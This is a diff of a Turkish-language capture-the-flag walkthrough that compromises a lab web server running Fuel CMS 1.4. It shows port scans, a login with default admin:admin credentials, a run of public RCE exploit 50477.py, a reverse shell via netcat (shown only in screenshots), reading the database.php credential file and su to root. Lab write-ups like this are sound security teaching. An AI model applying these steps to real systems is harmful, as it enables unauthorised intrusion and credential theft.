@@ -1,4 +1,6 @@
-Öncelikle bir Rustscan taraması yapıldı.Sebebi ise nmap taramasına göre biraz daha hızlı sonuç verdiği için.Rustscan ile yapılan taramada gördüğümüz portları nmap taraması yaparken detaylıca kullanabiliriz
+Öncelikle Rustscan ile bir port taraması gerçekleştirdik.
+Rustscan, Nmap'e kıyasla daha hızlı sonuç verdiği için tercih edildi. Bu tarama sonucunda elde ettiğimiz açık portları, daha detaylı bir analiz için Nmap ile yeniden taradık. Böylece, hem hızdan ödün vermemiş olduk hem de Nmap’in sunduğu derinlemesine bilgileri değerlendirme şansı yakaladık.
+
 
 ```bash
 rustscan -a 10.10.123.74
@@ -42,11 +44,13 @@ Read data files from: /usr/share/nmap
 Nmap done: 1 IP address (1 host up) scanned in 1.17 seconds
            Raw packets sent: 5 (196B) | Rcvd: 2 (84B)
 ```
-Rustscan çıktısına göre 80 portunun açık olduğunu ve http çalıştığını gördük sonrasında biraz daha detay için nmap taraması yapıldı.
+
 ---
 
-```bash
 
+Rustscan çıktısına göre 80 numaralı portun açık olduğunu ve HTTP servisi çalıştığını tespit ettik.
+Bu ön bilginin ardından, daha fazla detay elde edebilmek amacıyla 80 numaralı porta özel bir Nmap taraması gerçekleştirdik. Bu sayede, HTTP servisine ait versiyon bilgileri ve potansiyel açıklara dair daha kapsamlı bilgi elde etmeyi hedefledik.
+```bash
 nmap -Pn -sV -A 10.10.190.125 -p 80
 ```
 ```bash
@@ -72,31 +76,62 @@ HOP RTT      ADDRESS
 
 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 15.05 seconds
-
 ```
-Nmap taramasında sonra elimizde çıktıyı analiz ettik robots.txt olduğunu gördük ve websitesini ziyaret ettik
+
+---
+
+
+Nmap taramasının ardından elde ettiğimiz çıktıları analiz ettiğimizde, robots.txt dosyasının mevcut olduğunu fark ettik.
+Bu dosya genellikle arama motorlarına hangi sayfaların taranmaması gerektiğini bildirir; ancak bazen dizin gezintisi ya da gizlenmiş yollar hakkında ipuçları da barındırabilir. Bu nedenle ilgili web sitesini tarayıcıda ziyaret ederek robots.txt dosyasını inceledik.
 
 <img width="825" height="694" alt="fuelcms" src="https://github.com/user-attachments/assets/332593a0-54d2-4bce-8c37-de121ce11e7c" />
 
 <img width="602" height="471" alt="credential" src="https://github.com/user-attachments/assets/138e50f7-a454-44c6-adb9-48919f75b43a" />
 
-Gözümüze ilk başta versiyon bilgisi çarpıyor ve versiyonun 1.4 olduğunu öğreniyoruz sonrasında sayfanın aşağısına indiğimizde bir parola ve veritabanı ile ilgili bir dosya yolu olduğunu görüyoruz bunları notlarımıza kaydedip robots.txtye bakıyoruz.
+
+---
+
+
+İlk olarak, web sayfasını incelediğimizde dikkat çeken şey yazılımın versiyon bilgisiydi — sayfada “v1.4” sürümünün kullanıldığı belirtilmişti.
+Bu tür versiyon bilgileri, bilinen güvenlik açıklarını araştırmak açısından önemlidir.
+
+Sayfanın alt kısımlarına indiğimizde ise, bir parola ifadesi ile birlikte veritabanına ait olabileceğini düşündüğümüz bir dosya yoluna rastladık. Bu tür bilgiler genellikle istemeden sızdırılmış olabileceğinden, güvenlik testi kapsamında önemli ipuçları sağlar.
+
+Tüm bu gözlemlerimizi not aldıktan sonra, daha önce fark ettiğimiz robots.txt dosyasını incelemek üzere yönlendik.
 
 <img width="100" height="36" alt="robots txt" src="https://github.com/user-attachments/assets/dcb761a6-bcbe-49f3-a95b-2ef745ec0239" />
 
-Robots.txt nin yönlendirdiği sayfaya gidince bir login paneli ile karşılaşıyoruz
+
+---
+
+
+robots.txt dosyasını incelediğimizde, belirli bir dizine yönlendirme yapıldığını gördük.
+Bu dizini tarayıcıda ziyaret ettiğimizde ise karşımıza bir giriş (login) paneli çıktı. Bu panelin, daha önce web sayfasında gördüğümüz parola veya veritabanı bilgileriyle bağlantılı olabileceğini düşünerek detaylı analiz yapmaya karar verdik.
 
 <img width="715" height="601" alt="login" src="https://github.com/user-attachments/assets/98631993-a425-406e-9202-f0c61e3e65ae" />
 
-Websitesini ilk ziyaret ettiğimizde gördüğümüz kullanıcı adı parolayı admin:admin burada deniyoruz ve panele giriş yapıyoruz.
+
+---
+
+
+Web sitesini ilk ziyaret ettiğimizde sayfanın alt kısmında gördüğümüz admin:admin kullanıcı adı ve parolasını, login panelinde deniyoruz.
+Bu basit kimlik bilgileriyle giriş yapmayı denediğimizde, panel erişimini başarılı bir şekilde elde ediyoruz. Bu durum, sistemin varsayılan veya zayıf kimlik bilgileriyle korunduğunu gösteriyor ve güvenlik açısından ciddi bir zafiyeti işaret ediyor.
 
 <img width="1686" height="838" alt="dashboard" src="https://github.com/user-attachments/assets/c9911c55-5f4f-4488-86c1-15757fd4ca73" />
 
-Sonrasında searchsploit kullanarak bir arama yapıyoruz cms versiyonu hakkında.
+
+---
+
+
+Login paneline başarılı şekilde giriş yaptıktan sonra, daha önce tespit ettiğimiz CMS versiyonunu (v1.4) kullanarak SearchSploit aracı ile bir güvenlik açığı (exploit) araması gerçekleştirdik.
+SearchSploit, Exploit-DB veritabanındaki yerel exploit’leri taramamıza olanak tanır ve kullanılan yazılımın bilinen zafiyetleri hakkında hızlıca bilgi edinmemizi sağlar.
 
 ```bash
 searchsploit Fuel CMS 1.4
 ```
+
+Bu komutla yaptığımız arama sonucunda, elimizdeki sürüme yönelik potansiyel bir exploit veya zafiyet bulunduğunu gördük ve detaylarını incelemek üzere ilerledik.
+
 ```bash
 ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
  Exploit Title                                                                                                                                                                 |  Path
@@ -110,32 +145,49 @@ Fuel CMS 1.4.8 - 'fuel_replace_id' SQL Injection (Authenticated)                
 ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Shellcodes: No Results
 ```
-Ve bir RCE zaafiyeti olduğunu görüyoruz sonrasında bu py dosyasını localimize almak için -m parametresini kullanıyoruz
+
+SearchSploit çıktısını incelediğimizde, CMS'nin 1.4 sürümüne ait bir RCE (Remote Code Execution) zafiyeti bulunduğunu fark ettik.
+Bu exploit, hedef sistemde uzaktan komut çalıştırmamıza olanak tanıyabilecek kritik bir açıklıktı. Exploit dosyasını kendi sistemimize (local) almak için SearchSploit'in -m (mirror) parametresini kullandık:
 
 ```bash
 searhcsploit -m 50477.py
 ```
-Sonrasında python dosyamızı çalıştırıyoruz
+Bu işlemle exploit dosyasının bir kopyası kendi makinemize indirildi ve üzerinde düzenleme ya da doğrudan çalıştırma işlemleri için hazır hale getirildi.
+
+
+---
+
+
+Exploit dosyasını localimize aldıktan sonra, Python ortamında kodu çalıştırarak RCE zafiyetini test etmeye başladık.
+Bu adımda, exploit dosyasını çalıştırarak hedef sistem üzerinde komut çalıştırma imkânı sağladık ve sistem üzerinde kontrol elde etmeye yönelik ilk adımları attık.
 
 ```bash
 python3 50477.py -u http://<your_machine_ip>/
 ```
 
+Çalıştırma sırasında gerekli parametreleri ve hedef IP adresini exploit dosyasına ileterek komutlarımızın hedef sistemde yürütülmesini sağladık.
+
+
+
 <img width="591" height="371" alt="nc" src="https://github.com/user-attachments/assets/85929737-e213-49d5-a7c8-d2193a300c34" />
 
-sisten üzerinde nc çalıştığını görüyoruz ve revshell üretiyoruz kendimize
+Hedef sistem üzerinde Netcat (nc) servisinin yüklü ve çalışır durumda olduğunu tespit ettik.
+Bunun üzerine, kendi makinemize geri bağlantı (reverse shell) alabilmek için uygun bir reverse shell komutu oluşturduk ve hedef sisteme gönderdik. Böylece, hedef sistemde interaktif bir kabuk (shell) açarak tam kontrol sağlamayı amaçladık.
 
 <img width="1114" height="638" alt="revshell" src="https://github.com/user-attachments/assets/a2f5415f-4a0f-4f8c-a9b8-575e22fdfbe2" />
 
-oluşan payload kullanıyoruz
+Oluşturduğumuz payload’ı hedef sisteme gönderiyoruz.
+Bu payload, ters bağlantı (reverse shell) kurarak hedef makineden kendi sistemimize interaktif erişim sağlamamıza imkan tanıyor.
 
 <img width="729" height="52" alt="paylaod" src="https://github.com/user-attachments/assets/c8dc7679-a033-4866-a3e0-973c088c0d09" />
 
-Ve bağlantımızı rlwrap nc ile alıyoruz
+Bağlantıyı almak için rlwrap ile birlikte Netcat (nc) kullanıyoruz.
+rlwrap, Netcat terminalinde satır düzenleme ve geçmiş komutları kullanabilme gibi kolaylıklar sağladığı için, interaktif shell deneyimimizi daha verimli hale getiriyor.
 
 <img width="519" height="91" alt="shell" src="https://github.com/user-attachments/assets/8b5371d7-5bde-4fe5-afd3-4e1f3ada247a" />
 
-Home dizini altında ilk bayrağı alıyoruz
+Reverse shell bağlantısı sağlandıktan sonra, hedef sistemde kullanıcı ana dizini olan home dizinine geçiyoruz.
+Burada bulunan ilk bayrak dosyasını (flag) bulup okuyarak CTF'nin ilk amacını tamamlıyoruz.
 
 ```bash
 $ cd /home
@@ -147,12 +199,16 @@ flag.txt
 $ cat flag.txt
 6470xxxxxxxxxxxxxxx ==> :)
 $ 
-
 ```
-Sonrasıda notlarımızda olan veritabanı hakkında bilgi veren dosya yolunu okumaya çalışıyoruz.
+
+İlk bayrağı aldıktan sonra, önceden not ettiğimiz veritabanı dosyasının bulunduğu yol üzerinde inceleme yapmaya karar verdik.
+Bu dosyayı okuyarak, veritabanı hakkında daha fazla bilgi edinmeyi ve sistemdeki diğer potansiyel zafiyetleri araştırmayı hedefledik.
 
 ```bash
 $ cat fuel/application/config/database.php
+```
+
+```bash
 <?php
 defined('BASEPATH') OR exit('No direct script access allowed');
 
@@ -258,7 +314,8 @@ if (defined('TESTING'))
 $ 
 
 ```
-Burdan aldığımız bilgiler ile root kullanıcına erişiyoruz.
+Veritabanı dosyasından elde ettiğimiz bilgiler sayesinde, sistemde root kullanıcısına erişim sağlamayı başardık.
+Bu kritik aşama, genellikle şifreler, tokenlar veya yetki yükseltme için kullanılabilecek bilgiler içermektedir ve tam sistem kontrolü elde etmek için son adımdır.
 
 ```bash
 www-data@ubuntu:/home$ su root
@@ -276,3 +333,5 @@ b9bbxxxxxxxxxxxxxxxx ==> :)
 root@ubuntu:~# 
 
 ```
+Son olarak, sistemdeki tüm bayrakları (flags) toplayarak CTF görevini başarıyla tamamladık.
+Bu aşama, elde ettiğimiz erişimlerin ve yaptığımız keşiflerin doğrulanması açısından önemlidir.
